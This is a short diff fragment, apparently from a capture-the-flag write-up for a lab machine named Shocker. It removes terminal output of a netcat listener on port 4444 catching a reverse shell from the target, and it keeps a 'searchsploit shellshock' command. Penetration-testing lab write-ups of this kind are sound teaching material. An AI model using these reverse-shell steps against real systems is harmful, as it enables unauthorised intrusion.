@@ -5,19 +5,6 @@
 
 
 
-with burp
-hippoeug@kali:~$ sudo nc -lnvp 4444
-listening on [any] 4444 ...
-connect to [10.10.14.6] from (UNKNOWN) [10.129.139.89] 43856
-bash: no job control in this shell
-shelly@Shocker:/usr/lib/cgi-bin$ 
-
-
-
-
-
-
-
 
 hippoeug@kali:~$ searchsploit shellshock
 ------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
